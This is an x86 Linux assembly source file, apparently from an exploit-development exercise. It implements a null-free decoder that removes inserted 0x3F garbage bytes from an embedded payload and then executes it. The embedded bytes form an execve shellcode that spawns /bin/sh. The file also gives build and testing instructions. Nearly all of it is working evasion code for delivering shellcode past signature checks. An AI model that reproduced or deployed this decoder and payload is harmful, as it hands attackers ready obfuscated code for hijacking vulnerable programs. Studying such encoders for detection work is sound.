; Insertion Decoder - Assembly Language - Linux/x86
; Copyright (C) 2013 Geyslan G. Bem, Hacking bits
;
;   http://hackingbits.com
;   geyslan@gmail.com
;
; This program is free software: you can redistribute it and/or modify
; it under the terms of the GNU General Public License as published by
; the Free Software Foundation, either version 3 of the License, or
; (at your option) any later version.
;
; This program is distributed in the hope that it will be useful,
; but WITHOUT ANY WARRANTY; without even the implied warranty of
; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
; GNU General Public License for more details.
;
; You should have received a copy of the GNU General Public License
; along with this program.  If not, see <http://www.gnu.org/licenses/>.


;   insertion_decoder
;
;   * decoder has 33 bytes (the final amount depends on the shellcode length plus garbage bytes)
;   * null-free
;   * decodes any pattern of garbage insertion
;       Eg.: True Byte = X, Garbage Byte = _
;	     _ X _ X _ ...
;	     X _ _ X X ...
;	     X X X _ _ ... 
;
;
;   # nasm -f elf32 insertion_decoder.asm
;   # ld -m elf_i386 insertion_decoder.o -o insertion_decoder
;
;   Testing
;   "This binary will not work, because it attempts to modify the text segment where relies the coded shellcode"
;   "To test, extract the shellcode of this compiled binary and launch it from other binary"
	


global _start

section .text

_start:
	jmp getaddress

mainflow:
	pop esi				; extract the address of the shellcode from stack
	lea edi, [esi]			; load the shellcode address in edi to use in loop
	xor ecx, ecx			; zero the counter

decoder:
	mov ebx, dword [esi + ecx] 	; copy the two next bytes to ebx

	cmp bx, 0xF1F1			; compares with the signature in the shellcode's end
	je short execve			; is shellcode's end? if yes, run it

	inc ecx				; let's read the next byte in the next loop
 	cmp bl, 0x3F			; compares with the garbage byte (0x3F) AAS instruction
					; 3F is the least used opcode as analyzed here http://z0mbie.host.sk/opcodes.html (I know that it's a PE)

	je short decoder		; is an inserted garbage byte? so continue looping and trying to find the next one

	mov byte [edi], bl		; when isn't garbage, copy the byte to the correct address
	inc edi				; let's to set the next byte of the shellcode
	jmp short decoder		; continue decoding

getaddress:
	call mainflow			; call back just to get the eip (address of the execve below)
	execve: db 0x3F, 0x3F, 0x3F, 0x31, 0x3F, 0xc9, 0x3F, 0xf7, 0xe1, 0x3F
		db 0xb0, 0x0b, 0x3F, 0x51, 0x68, 0x3F, 0x2f, 0x2f, 0x3F, 0x73
		db 0x68, 0x3F, 0x68, 0x2f, 0x3F, 0x62, 0x69, 0x3F, 0x6e, 0x89
		db 0x3F, 0xe3, 0xcd, 0x3F, 0x80
		db 0xF1, 0xF1		; the two last bytes are the stop signature
